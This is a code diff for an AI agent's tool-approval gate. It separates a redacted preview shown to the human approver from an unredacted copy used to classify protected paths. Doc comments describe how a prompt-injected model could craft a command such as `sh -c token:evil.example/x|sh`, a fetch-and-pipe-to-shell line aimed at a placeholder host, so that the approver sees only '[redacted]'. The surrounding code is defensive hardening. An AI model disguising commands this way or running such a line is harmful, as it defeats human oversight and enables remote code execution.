@@ -367,6 +367,9 @@ async function confirmDispatch(
     toolId: def.id,
     action,
     preview: previewFor(action, target),
+    // The same field selection, UNSCRUBBED, for CLASSIFICATION only (see the field's own doc). In-process:
+    // it never reaches the event, so `preview` stays the one thing crossing the observability boundary.
+    unredactedPreview: rawPreviewFor(action, target),
   };
   // EA5: emit the observability event for EVERY governed dispatch that reaches this gate, just before the host
   // decides — a durable "a governed action was gated" trace on the session / `--json` stream (the session
@@ -437,22 +440,6 @@ export function governedAction(def: ToolDef, target: PolicyTarget): ToolActionCl
   return undefined;
 }
 
-/** Split on `/` and `\` while KEEPING the separators (the capture group), so a join round-trips exactly. */
-const PATH_SEPARATOR = /([/\\])/;
-
-/**
- * Scrub a path preview **one segment at a time**, so a detector match can never swallow a separator and take
- * the rest of the path with it. Structure-preserving by construction: the segment count, the separators and
- * their order are identical in and out, so a downstream classifier still sees every `.ssh` / `.git` /
- * `.relavium` segment — while a credential-shaped segment is still replaced. See {@link previewFor}.
- */
-function redactPathPreview(path: string): string {
-  return path
-    .split(PATH_SEPARATOR)
-    .map((part) => (part === '/' || part === '\\' ? part : redactSecretShapedText(part)))
-    .join('');
-}
-
 /**
  * A secret-free preview for the approval prompt: the resolved path / command / host (never a full URL).
  *
@@ -465,40 +452,38 @@ function redactPathPreview(path: string): string {
  * Display-only, in both directions: the dispatch has already resolved and policy-checked the REAL target
  * (`enforcePolicy` runs before `confirmDispatch`), so scrubbing here can never change which side effect runs.
  *
- * The one consumer that reads a preview field back is the CLI's `auto`-mode `isProtectedTarget` check
- * (`chat-mode-host.ts`), which classifies `preview.path` against `.git` / `.relavium` / `.ssh` and the rc
- * basenames. A whole-string scrub would break it: two of the detector's patterns (`bearer|basic|token <run>`
- * and `<key-ish>=<value>`) have character classes that include `/`, so ONE match can swallow the rest of the
- * path — `./Access Token Backup/.ssh/authorized_keys` collapses to `./Access Token [redacted]`, and the
- * protected segment classifies as unprotected. {@link redactPathPreview} therefore scrubs **per path segment**,
- * so no match can ever cross a separator and every `.ssh`/`.git` segment survives verbatim. The fs layer
- * hard-denies protected paths at three points regardless, so that check is the graceful UX, never the floor.
+ * The scrub is deliberately WHOLE-STRING rather than per-path-segment, and that is only safe because of
+ * {@link ToolApprovalRequest.target}. Two of the detector's patterns (`bearer|basic|token <run>` and
+ * `<key-ish>=<value>`) have value classes containing `/`, which cuts both ways: whole-string catches a
+ * credential whose value SPANS a separator (`./api_key=AAAAA/BBBBBB.txt` — a per-segment scrub misses it,
+ * because the visible part of the value falls under the pattern's own length floor), but one match can also
+ * swallow the rest of the path (`./Access Token Backup/.ssh/authorized_keys` → `./Access Token [redacted]`).
+ * No single pattern gives both. So the two USES are split instead: this projection is scrubbed as hard as
+ * secrecy requires, and the host's protected-path CLASSIFIER reads the unredacted `target` — where a swallowed
+ * `.ssh` segment cannot change the answer, because it never sees this string.
  *
- * The `command` field has no such structure to preserve and is scrubbed whole. Consequence worth naming: the
- * command string is fully model-controlled, the detector's patterns are public, and the preview is the ONLY
- * thing the approver sees — so a prompt-injected model can deliberately shape a payload to MATCH a pattern
- * (`sh -c token:evil.example/x|sh`) and be shown as `sh -c [redacted]`, which reads as "we protected you"
- * rather than "you cannot see this". Bounded by `allowedCommands`/`allowedCommandGlobs` being deny-all by
- * default, and by the fs/egress floors — but it is a real limitation of a redacted preview, not a solved
- * problem, and surfacing "this was redacted" to the prompt is the open follow-up.
+ * One limitation remains, and it is a property of redaction itself rather than of this choice: `command` is
+ * fully model-controlled and the detector's patterns are public, so a prompt-injected model can shape a
+ * payload to MATCH a pattern (`sh -c token:evil.example/x|sh`) and be shown `sh -c [redacted]` — which reads
+ * as "we protected you" rather than "you cannot see this". Bounded by `allowedCommands` /
+ * `allowedCommandGlobs` being deny-all by default and by the fs/egress floors, but real; surfacing "this was
+ * redacted" to the prompt needs a schema field and is the open follow-up.
  */
-function previewFor(action: ToolActionClass, target: PolicyTarget): ToolActionPreview {
+function rawPreviewFor(action: ToolActionClass, target: PolicyTarget): ToolActionPreview {
   switch (action) {
     case 'fs_write':
-      return target.path === undefined ? {} : { path: redactPathPreview(target.path) };
+      return target.path === undefined ? {} : { path: target.path };
     case 'process':
-      return target.command === undefined
-        ? {}
-        : { command: redactSecretShapedText(target.command) };
+      return target.command === undefined ? {} : { command: target.command };
     case 'egress': {
       if (target.url === undefined) {
         return {}; // web_search / mcp_call expose no pre-dispatch URL target — the action class is enough
       }
+      // The HOST only, never `target.url` — the raw URL carries the query string, which is exactly where a
+      // credential lives (`?token=…`). That exclusion is why an UNREDACTED copy of this shape is safe to hand
+      // the host at all; it is the one field selection both copies share.
       const parsed = extractHttpsHost(target.url);
-      // The host is provably an author-allowlisted FQDN by the time we get here (`enforceHttpEgress` ran in
-      // the floor above), so this scrub is defence in depth: it keeps all three preview fields on one rule,
-      // so a future action class or a reordered floor cannot quietly reopen the leak on this branch alone.
-      return parsed === null ? {} : { host: redactSecretShapedText(parsed.host) };
+      return parsed === null ? {} : { host: parsed.host };
     }
     case 'os':
       // read_clipboard / notify carry no path/command/host target — the action class + the tool id (on the
@@ -511,6 +496,16 @@ function previewFor(action: ToolActionClass, target: PolicyTarget): ToolActionPr
       return exhaustive;
     }
   }
+}
+
+/** The DISPLAY copy: {@link rawPreviewFor}'s field selection with every string scrubbed. */
+function previewFor(action: ToolActionClass, target: PolicyTarget): ToolActionPreview {
+  const raw = rawPreviewFor(action, target);
+  return {
+    ...(raw.path === undefined ? {} : { path: redactSecretShapedText(raw.path) }),
+    ...(raw.command === undefined ? {} : { command: redactSecretShapedText(raw.command) }),
+    ...(raw.host === undefined ? {} : { host: redactSecretShapedText(raw.host) }),
+  };
 }
 
 function enforceHttpEgress(toolId: ToolId, url: string, ctx: ToolDispatchContext): void {
